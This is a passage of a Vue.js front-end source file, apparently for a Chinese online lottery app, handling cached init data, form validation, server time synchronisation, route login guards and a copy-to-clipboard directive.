      // 请注意不要像上一行那样使用Object.assign拷贝对象.因为不是拷贝成新对象而是直接用的就是那个对象.导致下方的delete会把原Cache里的内容直接删掉
      ajax.CacheData=JSON.parse(JSON.stringify(CacheData))
      for (var i = AppArr.length - 1; i >= 0; i--) {
        delete ajax.CacheData[AppArr[i]]
      }
      // delete ajax.CacheData.LotteryHot
      // delete ajax.CacheData.LotteryConfig
      // delete ajax.CacheData.LotteryList
    }else{
      ajax.CacheData=CacheData
    }
    _fetch(ajax).then((json)=>{
      if (json.Code===1||json.Code===0) {
        fun&&fun(state)
      }else{
        layer.msgWarn(json.StrCode);
      }
    })
  },
  GetInitData(arr,fun){
    state.UserName&&arr.push("UserUpGradeBonus")
    console.log(arr);
    var newArr=[];
    for (var i = arr.length - 1; i >= 0; i--) {
      switch(arr[i]){
        //以下是每次都需要更新请求的
        case "UserBalance":
        case "UserWithdrawAvail":
        // case "PayLimit":
        case "WithdrawRemainTimes":
        case "UserGradeGrow":
        case "UserBankCardList":
          newArr.push(arr[i])
        break
        default:
          if (state[arr[i]]==null) {
            newArr.push(arr[i])
          }else if(LocalCacheArr.indexOf(arr[i])>-1){
            var time = _Tool.Date.getTime()
            var todayms = time%DAY_TIME - GMT_DIF   //当天的毫秒值
            time/=DAY_TIME
            time=Math.floor(time)%366
            if (LocalCacheData[arr[i]]!=time) {
              console.log(arr[i]+"过期");
              //每天0点20分更新
              if (todayms%DAY_TIME > 20 * 60 * 1000) {
                console.log(arr[i]+"更新");
                newArr.push(arr[i])
              }
            }else{
              console.log(arr[i]+"没过期");
            }
          }
      }
    }
    if (!newArr.length) {
      // console.log("全部都有");
      fun&&fun(state)
      return;
    }
    this.AjaxGetInitData(newArr,fun)
  },
  //保证校验时按顺序来
  format:function(obj, order, cfg){
    cfg = cfg || {}
    var f,v

    for(var i = 0;i < order.length;i++){
      var k = order[i];
      v = obj[k]
      f=cfg[k]||store.state._FomatConfig[k]

      // 如果是校验重复的
      if(k.indexOf('check') > -1){
        var target = k.slice(5), target_f = cfg[target] || store.state._FomatConfig[target]
        if(obj[k] !== obj[target]){
          console.log(obj[k], obj[target])
          return [k, `两次${target_f.Name} 不相同`]
        }
      }

      if (f) {
        if (!f.Reg.test(v)) {
          return [k,v?f.ErrMsg:(f.Name+"不能为空")];
        }
      }
    }

    return false;
  },
  getServerTime: (function(){
    var cantGetTime = 0,
        timeItemList = []
    return function(fun){
      var timeBegin = new Date().getTime()
      _fetch({Action: "GetServerTimeMillisecond"}).then((json)=>{
        var timeEnd = new Date().getTime()
        var interval = timeEnd - timeBegin
        var timeReg = /^\d{13}$/

        if(json.Code > -1 && timeReg.test(json.Data)){
          timeItemList.push(new TimeItem(interval, timeEnd, timeBegin, json.Data))
        }
        if(cantGetTime > 4){
          var noTimeGeted = timeItemList.every(timeItem=>!timeItem.SerTime)  //一次都没获取到数据
          if(noTimeGeted){
            var Difftime=0
            try{
              Difftime=(new Date().getTimezoneOffset()+480)*60
            }catch(e){
              layer.msgWarn('不支持getTimezoneOffset')
            }
            store.commit('setTmpDifftime', Difftime)
            layer.msgWarn('因无法同步服务器时间,您可能无法正常投注')
            cantGetTime = 0
            timeItemList = []
            fun && fun()

            // layer.url("因无法同步服务器时间,您将无法投注,请检查网络情况", '/index')
          }else{
            //有一些获取到了数据，但是超时了。从获取到的再择优
            store.commit('setDifftime', timeItemList)
            cantGetTime = 0
            timeItemList = []
            fun && fun()
          }

        }else{
          if(interval > 1000){
            cantGetTime++
            this.getServerTime(fun)
          }else{
            if(json.Code === 1) {
              if(!json.Data){
                cantGetTime++;
                this.getServerTime(fun);
              }else {
                store.commit('setDifftime', timeItemList)
                fun && fun()
                cantGetTime = 0
                timeItemList = []
              }
            }else{
              cantGetTime++;
              this.getServerTime(fun);
            }
          }
        }
      })
    }
  })(),
  beforEnter:function(to){
    var meta = to.matched[0].meta
    if(meta.user){
      if (!state.UserName) {
        state.login2path = to.path
        router.replace("/login")
      }else if(state.agent){
        state.AgentRebate||router.replace("/notfount")
      }
    }
    if (meta.verify) {
      var fy = meta.verify===1?1:state[meta.verify]
      if (to.path==="/setSafePwd") {fy*=1}
      if (fy&&(!state.UserVerify||meta.from.search(state.UserVerify)==-1)
      ) {
        console.log("条件不足");
        router.go(-1)
      }
    }
  },
}

window.RootApp = new Vue({
  el: '#app',
  store,
  router,
  methods:window.RootApp,
  data:{
    title: ''
  },
  watch:{
    $route(newRoute, oldRoute){
      // console.log(newRoute,name)
      this.setTitle(this.title, newRoute.name)
      if (this.$store.state.needVerify>5) {
        console.log("强制踩点功能");
        RootApp.AjaxGetInitData(["CloudUrl"])
      }
      if (_App) {
        localStorage.setItem('LastPath',newRoute.fullPath)
      }
    }
  },
  created:function(){
    this.WatchInitData(localState)
    this.setTitle(this.title, this.$route.name)

    var len = routes.length
    // var ToPath=localStorage.getItem('LastPath')
    // if(ToPath){
    //   router.push(ToPath)
    // }
    // var ToPath = (ToPath||location.pathname).toLowerCase()
    var ToPath = location.pathname.toLowerCase()
    if (ToPath==="/") {return}
    for (var i = 0; i < len; i++) {
      var actualPath = routes[i].path.toLowerCase().split('/')[1]  //去掉斜杠的第一个
      if (actualPath && ToPath.indexOf(actualPath) > -1) {
        this.beforEnter({ matched: [routes[i]] })
        break
      }
      // if (ToPath.search(routes[i].path.toLowerCase())>-1&&routes[i].path!='/') {
      //   this.beforEnter({matched:[routes[i]]})
      //   break
      // }
    }
    /*_App && ga('send', {
      hitType: 'pageview',
      page:routes[i].path,
      title: routes[i].name
    });*/
  },
  render: h => h(App),
});

// RootApp.WatchInitData(localState)

router.beforeEach((to, from, next) => {
  //不在scrollBehavior中设置，改为自己操控。来避免全部彩种进入时，被归位的问题
  if(to.name != '彩种'){
    document.body.scrollTop = 0
  }
  if(state.UserName&&state.UserName!==localStorage.getItem('UserName')){
    // 用户变更后要重新使用本地localStorage来修改本地State数据
    setState(UserArr)
  }
  state.turning=true
  RootApp.beforEnter(to)
  next();
});

router.afterEach((to, from) => {
  state.turning=false
  layer.closeAll()
  state.needVerify++
  sessionStorage.setItem("needVerify",state.needVerify)
  getIver()
  _App && ga('send', {
    hitType: 'pageview',
    page:to.path,
    title: to.name
  });
});

//全局指令
Vue.directive('copyBtn', {
  bind: function(el, binding, vnode){
    el.addEventListener('click', function(){
      var siblings= Array.prototype.filter.call(el.parentNode.children, function(child){ return child !== el; });
      var targetInput = siblings[0];
      targetInput.select()
      document.execCommand('copy')
    })
  }
})

//如果检测到copy事件
document.addEventListener('copy', function(e){
  var el = e.target
  var btn = [].filter.call(el.parentNode.children, child=>(child !== el))[0]
  if(btn&&btn.className.indexOf('copy') > -1){
    layer.msgWarn('已将内容复制到剪切板')
  }
})
